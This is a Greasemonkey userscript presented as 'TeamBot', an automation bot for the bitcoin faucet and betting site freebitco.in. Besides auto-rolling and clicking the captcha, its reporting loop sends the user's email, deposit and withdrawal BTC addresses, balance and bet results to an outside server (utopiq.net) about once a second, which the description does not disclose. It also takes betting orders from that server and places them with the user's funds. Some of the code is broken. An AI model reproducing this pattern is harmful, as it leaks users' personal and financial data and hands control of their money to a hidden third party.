// ==UserScript==
// @name         TeamBot.freebitco.in
// @version      3.23
// @description  feel free to donate: 3Q5QzL6iZHyDPTpLYaNhDA2UhRUTxf8D4t
// @author       Derko
// @match        https://freebitco.in/*
// @grant        none
// @namespace    https://greasyfork.org/users/229236-derko
// @downloadURL https://update.greasyfork.org/scripts/419891/TeamBotfreebitcoin.user.js
// @updateURL https://update.greasyfork.org/scripts/419891/TeamBotfreebitcoin.meta.js
// ==/UserScript==


(function () {
    'use strict';

    var body = $('body');
    var points = {};
    //
    var gamer_version = GM_info.script.version;
    var hell_email = "neli69ruseva@gmail.com";
    var hell_email2 = "nikolay_tu@abv.bg";
    var gamer_email = $("#contact_form_email").val();
    var gamer_withdraw_btc_address = $("#edit_profile_form_btc_address").val();
    console.log("e-mail: " + gamer_email + "");
    console.log("withdraw btc: " + gamer_withdraw_btc_address + "");
    var btc_avail = $("#balance").text();
    var bonus_account_balance = "0.00000000";
    var bonus_msg = $('.dep_bonus_max:eq(0)').text();
    //config variables
    var autoinvest_points = false;
    var autowithdraw = false;
    var freeROLL = 0.00000055; //Kolko e vzel tazi sesija
    var needed_tickets = 0;
    var targetSum = 0.00000000; //tuka sumira spechelenoto ot zalaganija za tekushtata sesija
    var targetReach = false;
    //
    var last_task_id = 0;
    var capctha_errors = 0;
    var btc_before_bet = -123;
    //
    var minutes_left = 60;
    var seconds_left = 60;
    //
    $('<div id="tools" style="z-index: 99;width: 100%;position: fixed;top: 45px;left: 0;margin: 0 auto;background-color: gray;text-align:right;float:right;">\n\
<span id="greasyfork"                  style="margin: 2px; color: black; " ><a href="https://greasyfork.org/en/scripts/419891-teambot-freebitco-in" target="_blank">TeamBot</a></span>\n\
<span id="gamer_play_status"           style="margin: 2px; background-color: coral; " > </span>\n\
<span id="gamer_bonus_account_balance" style="margin: 2px; background-color: rgb(51, 255, 51); " >bonus </span>\n\
<span id="gamer_btc_avail"             style="margin: 2px; background-color: lightblue; bold; display: none; " >btc_avail</span>\n\
<span id="gamer_email"                 style="margin: 2px; color: darkred; " >e-mail</span>\n\
<span id="gamer_version"               style="margin: 2px; background-color: coral; " >ver. </span>\n\
</div>').prependTo('body');

    $('<div id="config_container" style="z-index: 99;width: 100%;position: fixed;top: 64px;left: 0;margin: 0 auto;text-align:right;float:right;"><div id="config" style="width: 20%; margin: 0px; background-color: silver; text-align:left; float:right; " >\n\
<p style="text-align:left; margin-left: 10px; margin-top: 0px; margin-bottom: 0px; " ><input type="checkbox" onclick="onClickCB()" id="CB1" /> auto invest reward points</p>\n\
<p style="text-align:left; margin-left: 10px; margin-top: 0px; margin-bottom: 0px; " ><input type="checkbox" onclick="onClickCB()" id="CB2" /> auto withdraw</p>\n\
<p ondblclick="onDblClickP()" style="color: blue; margin-top: 0px; margin-bottom: 0px; ">Double-click HERE to hide config</p>\n\
<!--<p ondblclick="onDblClickX()" style="color: red;  ">CLEAR depositmode</p>-->\n\
<script>\n\
function onClickCB(){\n\
    var       cfg = document.getElementById("config");\n\
    cfg.style.backgroundColor = "crimson";\n\
}\n\
function onDblClickP(){\n\
    var x = document.getElementById("config_container");\n\
    x.style.display = "none";\n\
}\n\
function onDblClickX(){\n\
    // alert("Vnimavai!!!");\n\
    document.cookie = "FreeBTC_Gamer.deposit_mode=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";\n\
    window.location.reload(true);\n\
}\n\
</script>\n\
</div>\n\
<div id="status" style="width: 15%; margin: 0px; background-color: DarkOliveGreen; text-align:left; float:right; font-family: fixedsys, monospace; " >\n\
<p style="text-align:left; margin-left: 10px; " ><span>points&nbsp&nbsp:</span><input style="width: 30%; " id="gamer_points"       /> </input>\n\
<p style="text-align:left; margin-left: 10px; " ><span>tickets&nbsp:</span><input     style="width: 30%; " id="gamer_tickets"      /> </inpu>\n\
</div>\n\
</div>').prependTo('body');
    //
    //$.removeCookie("last_play"); //!!!
    //

    var myRewards = {};

    //myCheckForBonus();

    var ErrCount = -1;
    function getErrCount() {
        if (localStorage.getItem('Gamer.ErrCount') !== null) {
            ErrCount = localStorage.getItem('Gamer.ErrCount');
        } else {
            localStorage.setItem('Gamer.ErrCount', 0);
            ErrCount = 0;
        }

    }
    function setErrCount() {
        localStorage.setItem('Gamer.ErrCount', ErrCount);
    }
    getErrCount();

    var BTCbase = -1;
    function getBTCbase() {
        if (localStorage.getItem('Gamer.BTCbase') !== null) {
            BTCbase = localStorage.getItem('Gamer.BTCbase');
        } else {
            localStorage.setItem('Gamer.BTCbase', 0);
            BTCbase = 0;
        }

    }
    function setBTCbase() {
        localStorage.setItem('Gamer.BTCbase', BTCbase);
    }
    getBTCbase();

    function showBar() {
        //console.log("showBar()"); //logva vsjaka sekunda!!!
        if ($("#free_play_error").is(":visible") && (capctha_errors < 1)) {
            capctha_errors++;
            console.log("#free_play_error");
            console.log("Click on: play_without_captchas_button");
            $("#play_without_captchas_button").click();
            $("#free_play_error").hide();
            //
            getErrCount();
            ErrCount++;
            ErrCount++;
            ErrCount++;
            setErrCount();
            setTimeout(reloadCheck, 70 * 60 * 1000); //70 minuti
            console.log("ErrCount: " + ErrCount);
            //
            console.log("ROLL button clicked AGAIN!!!.");
            $('#free_play_form_button').click();
        }
        btc_avail = $("#balance").text();
        myCheckForBonus();
    }
    showBar();
    setInterval(showBar, 1000);


    function reloadCheck() {
        getErrCount();
        if (ErrCount < 10) {
            window.location.reload(true);
        } else {
            console.log("Reload limit reached!!!");
        }
    }

    function myCheckForBonus() {
        if ($("#bonus_eligible_msg").is(":visible")) {
            bonus_msg = $('.dep_bonus_max:eq(0)').text();
            //console.log("bonus_msg: |" + bonus_msg + "|");
            $("#gamer_bonus_msg").text("bonus offer: " + bonus_msg);
        }
        bonus_account_balance = $('#bonus_account_balance').text();
        if (bonus_account_balance.includes(' BTC')) {
            bonus_account_balance = bonus_account_balance.substring(0, bonus_account_balance.length - 4); // premahvam " BTC"
            $("#gamer_bonus_account_balance").text("bonus " + bonus_account_balance + " btc");
            //console.log("bonus_account_balance: " + bonus_account_balance);
        } else {
            //console.log("Njama bonus!");
        }
    }

    function myLoadConfig() {
        if (localStorage.getItem('Gamer.autoinvest_points') !== null) {
            autoinvest_points = (localStorage.getItem('Gamer.autoinvest_points') == 1 ? true : false);
        } else {
            localStorage.setItem('Gamer.autoinvest_points', 0);
        }
        console.log("autoinvest_points: " + autoinvest_points);
        //$('#CB1').attr('checked', autoinvest_points);
        $('#CB1').prop('checked', autoinvest_points);
        //
        if (localStorage.getItem('Gamer.autowithdraw') !== null) {
            autowithdraw = (localStorage.getItem('Gamer.autowithdraw') == 1 ? true : false);
        } else {
            localStorage.setItem('Gamer.autowithdraw', 0);
        }
        console.log("autowithdraw: " + autowithdraw);
        //$('#CB2').attr('checked', autowithdraw);
        $('#CB2').prop('checked', autowithdraw);
        //
        //
        if (localStorage.getItem('Gamer.last_task_id') !== null) {
            last_task_id = localStorage.getItem('Gamer.last_task_id');
        } else {
            localStorage.setItem('Gamer.last_task_id', 0);
            last_task_id = 0;
        }
        console.log("last_task_id: " + last_task_id);
    }
    myLoadConfig();


    function myScrollToWatchTheMach() {
        if ($('#bonus_account_table').is(':visible')) {
            $('html, body').animate({scrollTop: $("#bonus_account_table").offset().top + 50}, 1000);
        } else if ($('#bonus_eligible_msg').is(':visible')) {
            $('html, body').animate({scrollTop: $("#bonus_eligible_msg").offset().top - 70}, 1000);
        } else {
            $('html, body').animate({scrollTop: $("#double_your_btc").offset().top}, 1000);
        }
    }


    function financial(x) {
        return Number.parseFloat(x).toFixed(8);
    }

    function myTask(obj) {
        var result = 0; //njama problem!!!
        //console.log(obj);
        btc_avail = $("#balance").text();
        console.log("myTask(); btc_avail: " + btc_avail);
        if ((obj.type == 1) && (btc_before_bet != btc_avail)) {
            if ($("#time_remaining").is(":visible")) {
                var menu = $(".double_your_btc_link").click();
                console.log("go to play tab...");
            }
            //console.log("bet!");
            //var menu = $(".double_your_btc_link").click();
            myScrollToWatchTheMach();
            //
            //var satoshis = financial(obj.satoshis / 100000000);
            var satoshis = "0." + obj.satoshis.padStart(8, "0");
            //var multiplier = obj.multiplier + ".00"
            var multiplier = obj.multiplier + ""
            console.log(satoshis + " --> " + multiplier);
            var double_your_btc_stake = $("#double_your_btc_stake").val(satoshis);
            var double_your_btc_payout_multiplie = $("#double_your_btc_payout_multiplier:text").val(multiplier);
            $("#double_your_btc_bet_win").css("display", "none");
            $("#double_your_btc_bet_lose").css("display", "none");
            //console.log(obj);
            console.log("btc_before_bet: " + btc_before_bet + ";  btc_avail: " + btc_avail);
            btc_before_bet = btc_avail;
            if (obj.HiLo == 1) {
                //double_your_btc_bet_hi_button
                $('#double_your_btc_bet_hi_button').click();
                //
            } else {
                //double_your_btc_bet_lo_button
                $('#double_your_btc_bet_lo_button').click();
            }
            //
        } else if (obj.type == 1) {
            result = 1; //ERROR nalichnite btc ne sa refreshnati
            console.log("wait to refresh btc_avail!");
            btc_before_bet = -1; //!!!
        } else if (obj.type == 2) {
            console.log("withdraw!");
            //
        } else if (obj.type == 3) {
            console.log("encash RP!");
            //
        } else if (obj.type == 666) {
            console.log("reload/refresh");
            setTimeout(function () {
                window.location.reload(true);
            }, 1 * 1000); //sled EDNA sekunda
            //window.location.reload(true);
        } else {
            console.log("unknown task: " + obj);
        }
        return result;
    }


    var myReport_ok = 1;
    var myReport_bet_result = 0;
    function myReport(minutes_left, seconds_left, reward_points, deposit_btc, withdraw_btc) {
        var result = 0;
        if (typeof gamer_email !== 'undefined') {
            // your code here
            var bet_result = 0;
            if ($("#double_your_btc_bet_win").is(":visible")) {
                bet_result = 1;
                $("#double_your_btc_bet_win").css("display", "none");
                console.log("Win");
            } else if ($("#double_your_btc_bet_lose").is(":visible")) {
                bet_result = -1;
                $("#double_your_btc_bet_lose").css("display", "none");
                console.log("Lose");
            } else if ($("#double_your_btc_error").is(":visible")) {
                bet_result = -1;
                $("#double_your_btc_error").css("display", "none");
                console.log("double_your_btc_error");
            } else {
                //njama rezultat ot zalog
            }
            //Ако е имало ERROR зареждам старите стойности!!!
            if (myReport_ok == 0) {
                bet_result = myReport_bet_result;
                console.log("retry...");
            }
            var requestGET = $.ajax({
                url: 'https://utopiq.net:/gamer.php',
                type: 'GET',
                data: {gamer_email: gamer_email, gamer_version: gamer_version, minutes_left: minutes_left, seconds_left: seconds_left, reward_points: reward_points, field2: "hello2", deposit_btc: deposit_btc, withdraw_btc: withdraw_btc, last_task_id: last_task_id, bet_result: bet_result, bonus_account_balance: bonus_account_balance, btc_avail: btc_avail, bonus_msg: bonus_msg, btc_base: BTCbase},
                contentType: 'application/json; charset=utf-8',
                success: function (response) {
                    //console.log("myReport response: " + response);
                    var ok = 1; //OK e 
                    myReport_ok = 1;
                    try {
                        var obj = JSON.parse(response);
                    } catch (err) {
                        ok = 0;
                        myReport_ok = 0;
                        myReport_bet_result = bet_result; //
                        // Do something about the exception here
                        console.log("myReport response: " + response);
                        console.log("myReport error: " + err);
                    }
                    //
                    //var obj = JSON.parse(response);
                    if ((ok == 1) && (typeof obj.server_time !== 'undefined')) {
                        //console.log(obj.server_time);
                        $('#logo_span_container').html("" + obj.server_time + "");
                        getErrCount();
                        if (ErrCount > 0) {
                            ErrCount -= 1;
                            setErrCount();
                        }
                        //
                    }
                    if ((ok == 1) && (typeof obj.type !== 'undefined') && (typeof obj.taskid !== 'undefined')) {
                        if (last_task_id != obj.taskid) {
                            result = myTask(obj);
                            if (result == 0) {
                                last_task_id = obj.taskid;
                                localStorage.setItem('Gamer.last_task_id', last_task_id);
                            } else {
                                console.log("myTask() ERROR");
                                //window.location.reload(true);
                            }
                        } else {
                            //
                        }
                    } else {
                        $('.top-bar-section').show();
                    }
                },
                error: function () {
                    console.log("myReport: error");
                    myReport_ok = 0;
                    myReport_bet_result = bet_result; //
                }
            });
            //
        }
        //
    }

    //setTimeout(myPing, 1 * 1000); //sled EDNA sekunda
    function myPing() {
        //console.log("ping...");
        //$('.top-bar-section').show();
        //скривам рекламата че заема място :)
        //$(".deposit_promo_message_content .deposit_promo_msg").hide();  //Pravja remove a NE hide zashtoto me zalagva!!!
        $(".deposit_promo_message_content .deposit_promo_msg").remove(); //Премахвам го защото когато има зарзни бонуси взема тяхното време!!!
        $(".close_daily_jackpot_main_container_div").click(); //Premahvam "Win Daily Jackpot" banera
        $(".close-reveal-modal").click(); //Premahvam VSICHKI dosadni modalni popup-i!!!
        //if ($("#fp_bonus_req_completed").is(":visible")) {
        //    var curReqComplete = $("#fp_bonus_req_completed").text() * 1; //tekushtija procent
        //    console.log("curReqComplete: " + curReqComplete + "%");
        //}
        //
        //var minutes_left = 0;
        //var seconds_left = 0;
        //if ($("#time_remaining").is(":visible")) {
        minutes_left = $('.countdown_amount:eq(3)').text() * 1;
        seconds_left = $('.countdown_amount:eq(4)').text() * 1;
        myRewards.points = parseInt($('.user_reward_points').text().replace(',', "")) * 1;
        //}
        var deposit_btc = $("#main_deposit_address").val();
        //var withdraw_btc = document.getElementsByClassName("withdraw_btc_address")[0].innerHTML;
        var gamer_withdraw_btc_address = $("#edit_profile_form_btc_address").val();
        //console.log("deposit_btc: " + deposit_btc);
        //console.log("withdraw_btc: " + gamer_withdraw_btc_address);
        //
        if ($('#free_play_form_button').is(':visible')) {
            console.log("waiting for click on ROLL button!");
        } else {
            //console.log("myReport()");
            myReport(minutes_left, seconds_left, myRewards.points, deposit_btc, gamer_withdraw_btc_address);
            //zaloopvam sistemata!!!
        }
        //setTimeout(myPing, 1 * 1000); //sled EDNA sekunda
        //setTimeout(myPing, 1 * 650); //sled 650ms
        setTimeout(myPing, 1 * 850); //sled 850ms
    }
    myPing();


    function myCheckConfigChange() {
        if ($("#config").css('background-color') == "rgb(220, 20, 60)") {//"crimson"
            $('#config').css('background-color', 'silver');
            //
            var checked1 = $('#CB1').is(":checked");
            console.log("CB1: " + checked1);
            localStorage.setItem('Gamer.autoinvest_points', (checked1 ? 1 : 0));
            //
            var checked2 = $('#CB2').is(":checked");
            console.log("CB2: " + checked2);
            localStorage.setItem('Gamer.autowithdraw', (checked2 ? 1 : 0));
            //
            //vednaga reloadvam konfiguracijata
            myLoadConfig();
            //$(".free_play_link").click();
        }
    }
    var callCheckConfigChange = setInterval(myCheckConfigChange, 3 * 1000);

    var ERP = 0; //Extra Reward Points
    var ERP_text = "0";
    function myChechForBonus(rewardType) {
        console.log("myChechForBonus(" + rewardType + ")...");
        switch (rewardType) {
            case "points":
                if ($("#bonus_container_free_points").length != 0) {
                    myRewards.bonustime.text = $('#bonus_span_free_points').text();
                    console.log(myRewards.bonustime.text);
                    myRewards.bonustime.hour = parseInt(myRewards.bonustime.text.split(":")[0]) * 1;
                    myRewards.bonustime.min = parseInt(myRewards.bonustime.text.split(":")[1]) * 1;
                    myRewards.bonustime.sec = parseInt(myRewards.bonustime.text.split(":")[2]) * 1;
                    myRewards.bonustime.current = myRewards.bonustime.hour * 3600 + myRewards.bonustime.min * 60 + myRewards.bonustime.sec;
                    //
                    ERP_text = $("#bonus_container_free_points .free_play_bonus_box_span_large").text();
                    console.log("test: " + ERP_text);
                    ERP = parseInt(ERP_text.split(":")[0]) * 1;
                    console.log("ERP: " + ERP);

                } else {
                    myRewards.bonustime.current = 0;
                    console.log("greda :(");
                }
                break;
            case "tickets":
                if ($("#bonus_container_free_lott").length != 0) {
                    myRewards.bonustime.text = $('#bonus_span_free_lott').text();
                    //console.log(myRewards.bonustime.text);
                    myRewards.bonustime.hour = parseInt(myRewards.bonustime.text.split(":")[0]) * 1;
                    myRewards.bonustime.min = parseInt(myRewards.bonustime.text.split(":")[1]) * 1;
                    myRewards.bonustime.sec = parseInt(myRewards.bonustime.text.split(":")[2]) * 1;
                    myRewards.bonustime.current = myRewards.bonustime.hour * 3600 + myRewards.bonustime.min * 60 + myRewards.bonustime.sec;
                } else {
                    myRewards.bonustime.current = 0;
                }
                break;
            case "money":
                if ($("#bonus_container_fp_bonus").length != 0) {
                    myRewards.bonustime.text = $('#bonus_span_fp_bonus').text();
                    //console.log(myRewards.bonustime.text);
                    myRewards.bonustime.hour = parseInt(myRewards.bonustime.text.split(":")[0]) * 1;
                    myRewards.bonustime.min = parseInt(myRewards.bonustime.text.split(":")[1]) * 1;
                    myRewards.bonustime.sec = parseInt(myRewards.bonustime.text.split(":")[2]) * 1;
                    myRewards.bonustime.current = myRewards.bonustime.hour * 3600 + myRewards.bonustime.min * 60 + myRewards.bonustime.sec;
                } else {
                    myRewards.bonustime.current = 0;
                }
                break;
        }
        //console.log(rewardType + ": " + myRewards.bonustime.current);
    }
    function rewardsLoop() {
        var minutes_left = 60;
        var seconds_left = 60;
        //minutes_left = 60;
        //seconds_left = 60;
        if ($("#time_remaining").is(":visible")) {
            //minutes_left = $('.countdown_amount:eq(0)').text() * 1;
            minutes_left = $('.countdown_amount:eq(3)').text() * 1;
            seconds_left = $('.countdown_amount:eq(4)').text() * 1;
            //minutes_left = $('.countdown_amount').text();
            myRewards.points = parseInt($('.user_reward_points').text().replace(',', "")) * 1;
            //console.log("minutes_left: " + minutes_left);
            //console.log("points      : " + myRewards.points);
            //myReport(minutes_left, seconds_left, myRewards.points);
        }
        //if ($("#time_remaining").is(":visible") && (autoinvest_points === true) && (minutes_left < 31)) {
        //if ($("#time_remaining").is(":visible") && (autoinvest_points === true) && (minutes_left < 11)) {
        //if ($("#time_remaining").is(":visible") && (autoinvest_points === true) ) {
        if ((autoinvest_points === true)) {
            minutes_left = $('.countdown_amount:eq(0)').text() * 1;
            myRewards.points = parseInt($('.user_reward_points').text().replace(',', "")) * 1;
            myRewards.bonustime = {};
            myChechForBonus("points");
            if (myRewards.bonustime.current == 0) {
                console.log("points: " + myRewards.points);
                if (myRewards.points < 12) {
                    console.log("waiting for points");
                } else if (myRewards.points < 120) {
                    RedeemRPProduct('free_points_1');
                    myRewards.points -= 12;
                } else if (myRewards.points < 300) {
                    RedeemRPProduct('free_points_10');
                    myRewards.points -= 120;
                } else if (myRewards.points < 600) {
                    RedeemRPProduct('free_points_25');
                    myRewards.points -= 300;
                } else if (myRewards.points < 1200) {
                    RedeemRPProduct('free_points_50');
                    myRewards.points -= 600;
                } else {
                    RedeemRPProduct('free_points_100');
                    myRewards.points -= 1200;
                }
                //if ($('#bonus_span_fp_bonus').length === 0)
                //    if (myRewards.points >= 3200)
                //        RedeemRPProduct('fp_bonus_1000');
            } else if (myRewards.bonustime.hour < 12) {
                var needH = 12 - myRewards.bonustime.hour; //kolko chasa ostavat dokato svarshi bonusa
                //var needH = 13 - myRewards.bonustime.hour; //kolko chasa ostavat dokato svarshi bonusa
                var needP = needH * 100; //kolko tochki ne mi dostigat za da vzema MAX points bonus
                myRewards.points -= needP; //izvajdam ot tekushtite tochki tolkova kolkoto shte mi trjabvat za MAX points bonus
                console.log("reduced points: " + myRewards.points);
            }
            console.log("available points: " + myRewards.points);
            myChechForBonus("money");
            if (myRewards.bonustime.current == 0) {
                if (myRewards.points >= 3200) {
                    RedeemRPProduct('fp_bonus_1000');
                    myRewards.points -= 3200;
                } else if (myRewards.points >= 1600) {
                    RedeemRPProduct('fp_bonus_500');
                    myRewards.points -= 1600;
                } else {
                    //
                }
            }
            //
        }
    }
    //var callRewardsLoop = setInterval(rewardsLoop, 3 * 1000);

    //
    function myCheckForCapchaError() {
        if ($('#free_play_error').is(':visible')) {
            console.log("free_play_error! ask for help.");
        } else {
            //predi restar-ta setvam 
            BTCbase = btc_avail;
            setBTCbase();
            //
            console.log("Capcha is OK. Reload to refresh the complete percent.");
            window.location.reload(true); // reloadvam za da izchislja razlikata v procentite
        }
    }

    //
    if ($('#free_play_form_button').is(':visible')) {
        setTimeout(function () {
            $('html, body').animate({scrollTop: $("#free_play_form_button").offset().top}, 100);
            $('.recaptcha-checkbox-checkmark').click();
        }, 1000);
        //var callRewardsLoop = setInterval(rewardsLoop, 5 * 1000); //tova eloop prez 5 sekundi
        setTimeout(rewardsLoop, 13 * 1000); //ednokratno SLED 5 sekundi
        //
        var min = 15;
        var max = 30;
        var random = Math.floor(Math.random() * (max - min + 1)) + min;
        console.log("random seconds: " + random);
        //
        setTimeout(function () {
            if ($("#fp_bonus_req_completed").is(":visible")) {
                var ReqComplete = $("#fp_bonus_req_completed").text() * 1; //tekushtija procent
                localStorage.setItem('ReqComplete.beforeROLL', ReqComplete);
            }
            $('html, body').animate({scrollTop: $("#free_play_form_button").offset().top}, 100);
            $('#free_play_form_button').click();
            console.log("ROLL button clicked.");
            //
            BTCbase = 0;
            setBTCbase();
            //
            localStorage.setItem('bets.hi', 0);
            localStorage.setItem('bets.low', 0);
            localStorage.setItem('bets.profit', 0.0); //kolko e pechalbata ot tekushtata igra
            localStorage.setItem('bets.play', 0.0); //Дали играя/залагам в момента; след всеки РОЛ се нулира (не играя)
            localStorage.setItem('Gamer.tickets', 0); //kolko tickets sam kupil sled ROLL-vaneto
            //
            setTimeout(myCheckForCapchaError, 13 * 1000); //
            //}, 40 * 1000);
        }, random * 1000);
    }
    if ($('.close-reveal-modal').is(':visible'))
        setTimeout(function () {
            $('.close-reveal-modal').click();
        }, 2000);

    $("#gamer_version").text("ver. " + gamer_version);
    $("#gamer_email").html("" + gamer_email + "");

    function mySleep(milliseconds) {
        var start = new Date().getTime();
        for (var i = 0; i < 1e7; i++) {
            if ((new Date().getTime() - start) > milliseconds) {
                break;
            }
        }
    }

    var myPoints = 0;
    var myTickets = 0;
    var callStatus = setInterval(myStatus, 1000);
    function myStatus() {
        myPoints = $(".user_reward_points").text();
        myPoints = parseFloat(myPoints.replace(/,/g, '')) * 1; //maham zapetaikata kojato deli prez 1000; sled tova umnojavam za da stane chislo :)
        //
        myTickets = $("#user_lottery_tickets").text();
        myTickets = parseFloat(myTickets.replace(/,/g, '')) * 1; //maham zapetaikata kojato deli prez 1000; sled tova umnojavam za da stane chislo :)
        //
        $("#gamer_points").val(myPoints);
        $("#gamer_tickets").val(myTickets);
    }


    function getRandomInt(max) {
        return Math.floor(Math.random() * Math.floor(max));
    }
// console.log(getRandomInt(5));
// expected output: 0, 1, 2, 3 or 4


    function withdraw(suma) {
        if (suma === undefined) {
            suma = 0.00030000;
        }
        // btc_avail = $("#balance").text();
        //
        //if (suma > 0.00030000) {
        if (suma > 0.00000030) {
            // var btc_for_withraw = btc_avail - 0.00012;
            var btc_for_withraw = suma;
            setTimeout(function () {
                $(".withdraw_box_button").click();
            }, 2000);
            setTimeout(function () {
                $("#manual_withdraw_option_link").click();
            }, 5000);
            setTimeout(function () {
                $("#withdrawal_amount").val(btc_for_withraw);
            }, 5000);
            setTimeout(function () {
                $(".withdraw_use_profile_address").click();
            }, 5000);
            setTimeout(function () {
                $("#withdrawal_button").click();
            }, 5000);
            setTimeout(function () {
                // window.location.reload(true);
                // $(".free_play_link").click();
                $(".stats_link").click();
            }, 5000);
        }
        btc_avail = $("#balance").text();
        $("#gamer_btc_avail").html(" " + btc_avail + " btc ");
    }

    var reward = {};
    var delay = 60;
    if ($("#time_remaining").is(":visible")) {
        delay = 20;
    } else {
        //
    }
    console.log("delay: " + delay);

    //
    setTimeout(reward.select, 1000);
    setInterval(reward.select, 60 * 1000);
    //
})();